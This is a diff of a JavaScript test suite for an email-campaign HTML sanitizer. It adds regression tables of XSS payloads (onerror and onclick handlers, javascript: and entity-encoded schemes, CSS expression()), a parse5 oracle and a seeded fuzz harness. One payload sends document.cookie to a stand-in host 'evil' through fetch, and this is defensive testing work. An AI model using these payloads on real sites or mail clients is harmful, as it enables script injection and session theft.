+    // name, and `<` and `'` are ordinary characters in one), so the tag closes
+    // at its `>` and only the dangling `<!--` after it is tail-deleted. What
+    // has to stay true is what the test was written for: a live unsubscribe
+    // anchor on both paths.
     const body = `<img src=x ='"<!--[if mso]><!--<!--[if mso]>`
-    expect(sanitizeCampaignHtml(body)).toBe('')
+    expect(sanitizeCampaignHtml(body)).toBe(`<img src=x ='"<!--[if mso]>`)
     expect(hasLiveUnsubLink(shellOf(body))).toBe(true)
     expect(hasLiveUnsubLink(docOf(body))).toBe(true)
+    // The genuinely unterminated shape — a quoted value with no closing quote
+    // — is still dropped whole, which is what a browser does.
+    expect(sanitizeCampaignHtml(`<p>hi</p><img src=x alt='`)).toBe('<p>hi</p>')
     // The plain shape, pinned directly: the tag goes, the host's real content
     // before it stays.
     expect(sanitizeCampaignHtml("<p>hi</p><a title='x")).toBe('<p>hi</p>')
@@ -1601,5 +1903,436 @@ describe('sanitizeCampaignHtml — comment openers come from the tokenizer walk 
   it('a genuinely dangling comment is still tail-deleted', () => {
     expect(sanitizeCampaignHtml('<p>Sale!</p><!--')).toBe('<p>Sale!</p>')
     expect(sanitizeCampaignHtml('<p>Sale!</p><!-- half a thought')).toBe('<p>Sale!</p>')
+  })
+})
+
+// ---------------------------------------------------------------------------
+// ROUND 6. The tag scanner returned a PARTIAL TAG at any inner `<`, INCLUDING
+// one inside a quoted attribute value, and that was a live critical XSS:
+//
+//   <img src=x onerror="alert(document.domain);'<a'">
+//
+// sanitized to ITSELF. The cut left the handler's value with no closing quote,
+// so ON_ATTR_DQ (which needs one) did not match; ON_ATTR_BARE refuses a
+// leading quote; and URL_ATTR's bare alternative produced a value starting
+// with `"`, whose scheme check therefore said "relative" and kept it. The
+// whole family below was live, on both render paths, in parse5 and in jsdom.
+//
+// The fix is the tokenizer: inside a tag only `>` ends the tag, so the
+// attribute rules always see a COMPLETE attribute — and the rules now read the
+// tokenizer's attribute spans instead of pattern-matching the tag's text, so
+// an attribute whose name a regex cannot describe is still seen.
+//
+// EVERY ASSERTION HERE IS ON A PARSED DOCUMENT (finding 5). A substring test
+// is what let this ship.
+// ---------------------------------------------------------------------------
+describe('sanitizeCampaignHtml — a `<` inside a quoted attribute value (round-6 critical)', () => {
+  const Q = String.fromCharCode(34)
+  const SQ = String.fromCharCode(39)
+
+  // Every reproducer from the round-6 review, verbatim.
+  const PAYLOADS = [
+    ['onerror, value broken out with <a', `<img src=x onerror=${Q}alert(document.domain);${SQ}<a${SQ}${Q}>`],
+    ['onerror, line-comment form', `<img src=x onerror=${Q}alert(1)//</b${Q}>`],
+    ['onclick on a div', `<div onclick=${Q}alert(document.domain);${SQ}<a${SQ}${Q}>x</div>`],
+    ['onload exfiltrating cookies', `<img src=x onload=${Q}fetch(${SQ}//evil/${SQ}+document.cookie);${SQ}<a${SQ}${Q}>`],
+    ['javascript: href', `<a href=${Q}javascript:alert(1);${SQ}<b${SQ}${Q}>click</a>`],
+    ['javascript: img src', `<img src=${Q}javascript:alert(1);${SQ}<b${SQ}${Q}>`],
+    ['javascript: td background', `<td background=${Q}javascript:alert(1);${SQ}<b${SQ}${Q}>`],
+    ['javascript: video poster', `<video poster=${Q}javascript:alert(1);${SQ}<b${SQ}${Q}>`],
+    ['javascript: button formaction', `<button formaction=${Q}javascript:alert(1);${SQ}<b${SQ}${Q}>`],
+    ['uppercase tag and attribute', `<IMG SRC=x ONERROR=${Q}alert(1);${SQ}<a${SQ}${Q}>`],
+    ['whitespace around the =', `<img src=x onerror = ${Q}alert(1);${SQ}<a${SQ}${Q}>`],
+    ['slash-separated handler', `<img/onerror=${Q}alert(1);${SQ}<a${SQ}${Q}>`],
+    ['entity-encoded scheme', `<a href=${Q}&#106;avascript:alert(1);${SQ}<b${SQ}${Q}>c</a>`],
+    ['mixed-case scheme', `<a href=${Q}jAvAsCrIpT:alert(1);${SQ}<b${SQ}${Q}>c</a>`],
+    ['single-quoted value hiding a "', `<img src=x onerror=${SQ}alert(1);${Q}<a${Q}${SQ}>`],
+    ['handler abutting the next attribute', `<img src="x"onerror=${Q}alert(1);${SQ}<a${SQ}${Q}>`],
+    ['handler inside a full-document export', `<!DOCTYPE html><html><body><img src=x onerror=${Q}alert(1);${SQ}<a${SQ}${Q}></body></html>`],
+  ]
+
+  for (const [name, body] of PAYLOADS) {
+    it(`${name} — no live handler and no live scheme survives, on either render path`, () => {
+      const out = sanitizeCampaignHtml(body)
+      // 1. The sanitizer changed something (every one of these was a no-op).
+      expect(out).not.toBe(body)
+      // 2. Idempotent.
+      expect(sanitizeCampaignHtml(out)).toBe(out)
+      // 3. PARSED: no on* attribute, no scheme outside the allowlist.
+      expect(handlerAttrs(out)).toEqual([])
+      expect(badSchemeAttrs(out)).toEqual([])
+      // 4. And on both render paths, with parse5 AND jsdom, the whole
+      //    invariant — including the one live unsubscribe anchor.
+      expectSafeBothPaths(body, { jsdom: true })
+    })
+  }
+
+  it('the handler is gone from the DOM, not merely from the string', () => {
+    // The negative control for the table above: jsdom is asked directly.
+    const body = `<img src=x onerror=${Q}alert(document.domain);${SQ}<a${SQ}${Q}>`
+    for (const html of Object.values(renderBothPaths(body))) {
+      const { window } = new JSDOM(html)
+      expect(window.document.querySelector('[onerror]')).toBeNull()
+      expect(window.document.querySelectorAll('img').length).toBeGreaterThan(0)
+    }
+    // …and the detector is real: it finds the handler in the RAW payload.
+    expect(new JSDOM(`<body>${body}</body>`).window.document.querySelector('[onerror]')).not.toBeNull()
+  })
+
+  it('the tokenizer keeps the WHOLE quoted value in one attribute', () => {
+    // The boundary itself, asserted directly: with the round-5 rule the tag
+    // ended at the `<a` and everything after it was re-read as attribute-name
+    // position, which is what made the handler unrecognisable to a regex that
+    // needed a closing quote.
+    const input = `<img src=x onerror=${Q}alert(1);${SQ}<a${SQ}${Q} alt=${Q}z${Q}>`
+    const [tag] = markupTagSpans(input)
+    expect(markupTagSpans(input)).toHaveLength(1)
+    expect(tag.end).toBe(input.length)
+    expect(tag.attrs.map((a) => input.slice(a.nameStart, a.nameEnd))).toEqual(['src', 'onerror', 'alt'])
+    expect(input.slice(tag.attrs[1].valueStart, tag.attrs[1].valueEnd)).toBe(`alert(1);${SQ}<a${SQ}`)
+  })
+
+  it('a legitimate quoted value containing a `<` is still kept verbatim', () => {
+    // The fidelity side of the same rule: `<` in a value is ordinary text, and
+    // ordinary marketing copy uses it.
+    const html = '<img src="https://acme.ie/a.png" alt="5 < 6 seats left" title="a<b">'
+    expect(sanitizeCampaignHtml(html)).toBe(html)
+  })
+})
+
+// ---------------------------------------------------------------------------
+// ROUND 6, FINDING 2. Tag-name position kept `=` as a terminator, and a real
+// tokenizer does not: only whitespace, `/` and `>` end a tag name. So
+//
+//   <s=<x='><!--</>
+//
+// is ONE element named `s=<x='` followed by a comment that never closes — to
+// parse5, to jsdom and to every browser — while the sanitizer entered a
+// phantom single-quoted value, never offered the `<!--` to the comment rule
+// and emitted the run verbatim. The footer injected after it landed inside
+// that phantom quote: ZERO live `a[href]` in the parsed document on both
+// paths, with the word "Unsubscribe" still in the source. 0.6% of random fuzz
+// bodies hit this family.
+// ---------------------------------------------------------------------------
+describe('sanitizeCampaignHtml — `=` belongs to the TAG NAME (round-6 finding 2)', () => {
+  const SQ = String.fromCharCode(39)
+  const FAMILY = [
+    '<s=<x=' + SQ + '><!--</>',
+    '<s=<img src=x =' + SQ + '"<!--[if mso]><!--</body>' + SQ,
+    '<a=<b=' + SQ + '>text',
+    '<p=<q=' + SQ + '><!--',
+    '<s=<x=' + SQ + '></s=<x=' + SQ + '>',
+    '<div=<span=' + SQ + '>hi</div>',
+  ]
+
+  for (const body of FAMILY) {
+    it(`${JSON.stringify(body)} — still ships exactly one live unsubscribe anchor`, () => {
+      expectSafeBothPaths(body, { jsdom: true })
+    })
+  }
+
+  it('the element really is named `s=<x=` + a quote, which is what parse5 says too', () => {
+    // Pinned as a positive fact, not only as "nothing broke": the walk agrees
+    // with the parser about what this run IS.
+    const body = '<s=<x=' + SQ + '><!--</>'
+    expect(parsedElements(sanitizeCampaignHtml(body))).toContain('s=<x=' + SQ)
+    expect(markupTagSpans(body).map((t) => [t.start, t.end, t.name])).toEqual([[0, 8, 's=<x=' + SQ]])
+  })
+})
+
+// ---------------------------------------------------------------------------
+// ROUND 6, FINDING 3. The URL check has always entity-decoded before sniffing
+// a scheme; the inline `style=` scrub did not, so an entity hid a CSS keyword
+// from it completely.
+// ---------------------------------------------------------------------------
+describe('sanitizeCampaignHtml — the style attribute is decoded before it is scrubbed (round-6 finding 3)', () => {
+  it('an entity-encoded expression() is dropped', () => {
+    const out = sanitizeCampaignHtml('<p style="width:&#101;xpression(alert(1))">a</p>')
+    expect(out).not.toMatch(/xpression/i)
+    expect(parsedAttributes(out).filter((a) => a.name === 'style')).toEqual([])
+    expect(out).toContain('a</p>')
+  })
+
+  it('an entity-encoded javascript: scheme is dropped', () => {
+    const out = sanitizeCampaignHtml('<p style="x:&#106;avascript&colon;alert(1)">a</p>')
+    expect(out).not.toMatch(/avascript/i)
+    expect(parsedAttributes(out).filter((a) => a.name === 'style')).toEqual([])
+  })
+
+  it('a decoded quote cannot break out of the attribute', () => {
+    // The decode is what makes this possible at all, so the re-escape is what
+    // makes the decode safe: whatever survives the scrub is written back with
+    // `&`, `"` and `'` escaped, and the parser sees ONE attribute.
+    const out = sanitizeCampaignHtml('<p style="color:red&#34;&#32;onclick&#61;alert(1)">a</p>')
+    expect(handlerAttrs(out)).toEqual([])
+    expect(parsedAttributes(out).map((a) => a.name)).toEqual(['style'])
+  })
+
+  it('is a FIXED POINT: escape, decode, scrub, escape again changes nothing', () => {
+    for (const body of [
+      '<p style="color:red">a</p>',
+      '<p style="font-family:&#34;Segoe UI&#34;,sans-serif">a</p>',
+      '<td style="background:url(https://tracker/x.gif)">c</td>',
+      '<p style="width:&#101;xpression(alert(1))">a</p>',
+      '<p style="a:b&amp;c">a</p>',
+    ]) {
+      const once = sanitizeCampaignHtml(body)
+      expect(sanitizeCampaignHtml(once)).toBe(once)
+      expect(sanitizeCampaignHtml(sanitizeCampaignHtml(once))).toBe(once)
+    }
+  })
+
+  it('an ampersand in a kept value is escaped, and survives a second pass unchanged', () => {
+    const out = sanitizeCampaignHtml('<p style="a:b&c">x</p>')
+    expect(out).toContain('style="a:b&amp;c"')
+    expect(sanitizeCampaignHtml(out)).toBe(out)
+  })
+})
+
+// ---------------------------------------------------------------------------
+// ROUND 6, FINDING 4. Junk attribute NAMES — `on<p`, `on<table`, `on<!--` —
+// reached the DOM, because the handler rules were regexes that could only
+// describe `on[a-z]+=`. The rule is now structural: any attribute whose name
+// starts with `on` goes, value or no value.
+// ---------------------------------------------------------------------------
+describe('sanitizeCampaignHtml — every attribute whose name starts with `on` (round-6 finding 4)', () => {
+  const JUNK = [
+    '<b on<p>x</b>',
+    '<b on<table>x</b>',
+    '<b on<!-->x</b>',
+    '<b onerror>x</b>',
+    '<b onerror=>x</b>',
+    '<b onerror= >x</b>',
+    '<b ONERROR>x</b>',
+    '<img src=x on<style>a{color:red}</style>error=alert(1)>',
+    '<b onİ=1>x</b>',
+  ]
+
+  for (const body of JUNK) {
+    it(`${JSON.stringify(body)} — nothing starting with "on" reaches the DOM`, () => {
+      const out = sanitizeCampaignHtml(body)
+      expect(handlerAttrs(out)).toEqual([])
+      expect(sanitizeCampaignHtml(out)).toBe(out)
+    })
+  }
+
+  it('a Turkish dotted capital I never drives an offset (it lowercases to TWO code points)', () => {
+    // `'İ'.toLowerCase().length === 2`, so lowercasing the DOCUMENT to
+    // find attribute names would desynchronise every offset after it. Names
+    // are lowercased one at a time, for comparison only.
+    expect('İ'.toLowerCase().length).toBe(2)
+    const html = '<b İtitle="x" alt="İ">hi</b>'
+    expect(sanitizeCampaignHtml(html)).toBe(html)
+    expect(markupTagSpans(html)[0].end).toBe(html.indexOf('>') + 1)
+  })
+
+  it('a legitimate attribute that merely CONTAINS "on" is untouched', () => {
+    const html = '<td colspan="2" font="x">c</td><a href="https://x.ie" rel="noopener">go</a>'
+    expect(sanitizeCampaignHtml(html)).toBe(html)
+  })
+})
+
+// ---------------------------------------------------------------------------
+// THE ONE PLACE sanitizeCampaignHtml IS NOT IDEMPOTENT, pinned so it stays
+// understood rather than rediscovered. It is PRE-EXISTING and byte-identical
+// to the sanitizer round 6 replaced; the round-6 jsdom fuzz is simply the
+// first run that generated the shape.
+// ---------------------------------------------------------------------------
+describe('sanitizeCampaignHtml — the literal placeholder prefix can be re-spliced (known, inert)', () => {
+  it('a strip welds `@@UN1T_` back together, and a SECOND sanitize then removes it', () => {
+    // The sanitizer strips the literal prefix from the INPUT (belt and braces
+    // behind the per-call nonce, which is the real defence). A later strip can
+    // weld it back out of the host's own text — inert, because it carries no
+    // nonce and matches no placeholder regex — and the next call's input strip
+    // takes it away again.
+    const body = 'a@@UN1T<form>_STYLE_0@@b'
+    const once = sanitizeCampaignHtml(body)
+    expect(once).toBe('a@@UN1T_STYLE_0@@b')
+    expect(sanitizeCampaignHtml(once)).toBe('aSTYLE_0@@b')
+    // What it is NOT: a way to make a <style> element appear.
+    expect(parsedElements(once)).not.toContain('style')
+    expect(sanitizeCampaignHtml(`${body}<style>.a{color:red}</style>`)).toContain('<style>.a{color:red}</style>')
+  })
+
+  it('everything else round-trips: sanitizing twice changes nothing', () => {
+    for (const body of [
+      '<p>Hi <b>there</b></p>',
+      '<a href="https://acme.ie/x">go</a><img src="https://acme.ie/a.png" alt="a">',
+      '<style>.a{color:red}</style><meta name="viewport" content="x"><p>x</p>',
+      '<!--[if mso]><style>.b{color:blue}</style><![endif]--><p>y</p>',
+      '<img src=x onerror="alert(1)">',
+      '<td style="background:url(https://tracker/x.gif)">c</td>',
+    ]) {
+      const once = sanitizeCampaignHtml(body)
+      expect(sanitizeCampaignHtml(once)).toBe(once)
+    }
+  })
+})
+
+// ---------------------------------------------------------------------------
+// THE WALK IS PINNED AGAINST A REAL PARSER.
+//
+// Everything above rests on one claim: the walk finds tags exactly where an
+// HTML parser finds them. That claim is checked here against parse5's own
+// source offsets over a corpus of the shapes that have gone wrong — and by the
+// same comparison over 100,000 random inputs in the round-6 fuzz harness,
+// which found zero disagreements.
+// ---------------------------------------------------------------------------
+describe('markupTagSpans — parse5 boundary oracle', () => {
+  const SQ = String.fromCharCode(39)
+  const CORPUS = [
+    '<p>hi</p>',
+    '<img src=x onerror="alert(1);' + SQ + '<a' + SQ + '">',
+    '<s=<x=' + SQ + '><!--</>',
+    '<img alt="a<b>c">',
+    '<img title="a>b" style="x">',
+    '<a<b>text</a<b>',
+    '<a href=x" y="z>AAA" BBB=x>',
+    '<a href=alert(1)="<!--[if mso]>',
+    '<img src=x =' + SQ + '"<!--[if mso]><!--</body>' + SQ,
+    '<b x="y"onerror=alert(1)>',
+    '<img/onerror=1>',
+    '<br//>',
+    '<b/ x>',
+    '<b =v>',
+    '<b a==b>',
+    '<b a=>',
+    '<b a= >',
+    '<b a="1"b=2>',
+    '<b a=1/>',
+    '<b\t\r\n a=1 >',
+    '<b a=1\f b=2>',
+    '<div\n>x</div\n>',
+    '<p a=1 b = 2 c=' + SQ + '3' + SQ + ' d>',
+    '<b <p>x</b>',
+    '<b on<p=1>x</b>',
+    '<scr<!--ipt>alert(1)</scr<!--ipt>',
+    '<a href="/x" title="a<!--b">Link</a>',
+    '<!--[if mso]><b>x</b><![endif]-->',
+    '<!DOCTYPE html><html><body><p>x</p></body></html>',
+    '<b İ=1>x</b>',
+    '<b a= c>x</b>',
+    '<b a="ß">x</b>',
+    '<td background="javascript:1;' + SQ + '<b' + SQ + '">c</td>',
+    '<div onclick="alert(1);' + SQ + '<a' + SQ + '">x</div>',
+    '<video poster="j:1"></video>',
+    '<a href=x>a</a><a href=y>b</a>',
+    '<b>1</b><i>2</i><u>3</u>',
+    '<p>a<p>b',
+    '<table><b>x</b></table>',
+    '<b a="1" b=' + SQ + '2' + SQ + ' c=3 d>x</b>',
+  ]
+
+  /** parse5's own start/end tag offsets, as `start,end`. */
+  function parse5TagOffsets(input) {
+    const frag = parse(input, { sourceCodeLocationInfo: true })
+    const found = []
+    const walk = (n) => {
+      const loc = n.sourceCodeLocation
+      if (loc && loc.startTag) found.push(`${loc.startTag.startOffset},${loc.startTag.endOffset}`)
+      if (loc && loc.endTag) found.push(`${loc.endTag.startOffset},${loc.endTag.endOffset}`)
+      for (const c of n.childNodes || []) walk(c)
+      for (const c of (n.content && n.content.childNodes) || []) walk(c)
+    }
+    walk(frag)
+    return found
+  }
+
+  for (const input of CORPUS) {
+    it(`agrees with parse5 on ${JSON.stringify(input)}`, () => {
+      const spans = new Set(markupTagSpans(input).map((t) => `${t.start},${t.end}`))
+      const missing = parse5TagOffsets(input).filter((o) => !spans.has(o))
+      expect({ input, missing }).toEqual({ input, missing: [] })
+    })
+  }
+
+  it('the oracle is a real detector — a scanner that stops at an inner `<` fails it', () => {
+    // Negative control. This is the round-5 scanner's rule ("a partial tag
+    // ends at the next tag-opening `<`") applied to the critical payload: it
+    // would end the tag at the `<a`, parse5 ends it at the final `>`.
+    const input = '<img src=x onerror="alert(1);' + SQ + '<a' + SQ + '">'
+    const parse5Span = parse5TagOffsets(input)[0]
+    expect(parse5Span).toBe(`0,${input.length}`)
+    const partialEnd = input.indexOf('<a')
+    expect(partialEnd).toBeGreaterThan(0)
+    expect(`0,${partialEnd}`).not.toBe(parse5Span)
+    expect(markupTagSpans(input).map((t) => `${t.start},${t.end}`)).toEqual([parse5Span])
+  })
+
+  it('the deliberate conditional-comment convention is the ONE place the walk sees more', () => {
+    // parse5 reads `<!--[if mso]><b>x</b><![endif]-->` as a single comment and
+    // reports no tags inside it. The walk scans the interior as markup on
+    // purpose — every Unlayer and Canva export puts the Outlook stylesheet in
+    // there, and mso really does parse it — so it reports the <b> as well.
+    // That is a walker SUPERSET, never a disagreement about a tag parse5 does
+    // report, which is what the corpus above asserts.
+    const input = '<!--[if mso]><b>x</b><![endif]-->'
+    expect(parse5TagOffsets(input)).toEqual([])
+    expect(markupTagSpans(input).map((t) => t.name)).toEqual(['b', 'b'])
+  })
+})
+
+// ---------------------------------------------------------------------------
+// A SEEDED MINI-FUZZ, running the SAME parsed-document invariant the round-6
+// harness runs over 100,000 bodies. Two thousand bodies from a fixed seed is
+// not a substitute for that run; it is the part of it that can live in CI, so
+// a regression in the tokenizer cannot reach main between reviews.
+// ---------------------------------------------------------------------------
+describe('sanitizeCampaignHtml — seeded mini-fuzz over the parsed invariant', () => {
+  const SQ = String.fromCharCode(39)
+  const ATOMS = [
+    '<select>', '</select>', '<option>', '<title', '<title>', '</title>',
+    '<textarea', '</textarea>', '<plaintext>', '<xmp>', '<template>', '<noscript>',
+    '<style>', '</style>', '</style foo>', '<style ', 'a{b:c}',
+    '<meta name=viewport', '<meta name=viewport>', '<meta name="viewport" content="x">',
+    '<script>', '</script>', '<script ', 'alert(1)',
+    '<iframe>', '<object>', '<embed>', '<form>', '<base href="//evil/">', '<svg>', '<math>',
+    '@@UN1T_', '@@UN1T', '_STYLE_0@@', '_VIEWPORT@@',
+    '&#x3C;', '&lt;', '&#60;', '&#106;avascript&colon;',
+    ' ', '\r\n', '\f', '\t', 'İ', 'ß',
+    '<a href=x>', '</a>', '<a href="javascript:alert(1)">', '<a href=javascript:alert(1)>',
+    '<b onclick="a">', '<b onclick=a>', '<b onclick=' + SQ + 'a' + SQ + '>', '<b x="y"onerror=alert(1)>',
+    '<img src=x on', 'error=alert(1)', '<img/onerror=alert(1)>',
+    '<a<b>', '<a<', '</ x>', '</ ', '</1>', '<?php ?>', '<!x>', '<!', '<!-->', '<!--->',
+    '<!--', '-->', '--!>', '<!--[if mso]>', '<![endif]-->', '<!--<![endif]-->',
+    '<td style="background:url(http://t/x.gif)">', '<td style="expression(alert(1))">',
+    '<td style="@import url(http://t/a)">', '<p style=', 'style="',
+    '"', SQ, '=', '>', '<', '/', '/>', '<div', ' href=', ' src=', ' poster=',
+    ' formaction=', ' background=', ' action=', ' xlink:href=',
+    'hi', '<p>', '</p>', '<b>', '</b>', '<td>', '<tr>', '<table>',
+    '<img alt="a<b>c">', '<img src=x <script>', '<a href=alert(1)="<!--[if mso]>',
+    '<img src=x =' + SQ + '"<!--[if mso]><!--</body>', '<s=', '=' + SQ, '<x=' + SQ, '=' + SQ + '>', '<a="', '</>',
+    '<!--</body>-->', '</body>', '<body>',
+  ]
+
+  it('2,000 random bodies, both render paths, all clean', () => {
+    let seed = 20260907 // FIXED: a failure here is reproducible by re-running.
+    const rnd = () => { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed / 0x7fffffff }
+    const failures = []
+    const started = performance.now()
+    for (let i = 0; i < 2000; i++) {
+      const k = 1 + Math.floor(rnd() * 8)
+      let body = ''
+      for (let j = 0; j < k; j++) body += ATOMS[Math.floor(rnd() * ATOMS.length)]
+      const once = sanitizeCampaignHtml(body)
+      // The one KNOWN exception to idempotence, and it is pre-existing and
+      // byte-identical to the sanitizer this replaced: a strip can re-splice
+      // the LITERAL placeholder prefix out of text the host wrote either side
+      // of a stripped tag (`@@UN1T` + `<form>` + `_STYLE_0@@`), and the NEXT
+      // call's input-side prefix strip then removes it. See the test below.
+      if (!once.includes('@@UN1T_') && sanitizeCampaignHtml(once) !== once) failures.push([body, ['not idempotent']])
+      for (const [path, html] of Object.entries(renderBothPaths(body))) {
+        const problems = invariantProblems(parse5Tree(html))
+        if (problems.length) failures.push([`${path}: ${body}`, problems])
+      }
+      if (failures.length > 3) break
+    }
+    expect(failures).toEqual([])
+    // THE BOUND IS DELIBERATELY LOOSE, for the same reason the round-5 timing
+    // tests are: 2,000 bodies through both render paths and parse5 measures
+    // about 0.6s on a 2024 laptop, and this asserts 6s. What it has to catch
+    // is an accidental quadratic that makes this suite unrunnable, not CI
+    // jitter — a flaky timing test gets deleted rather than fixed.
+    expect(performance.now() - started).toBeLessThan(6000)
   })
 })
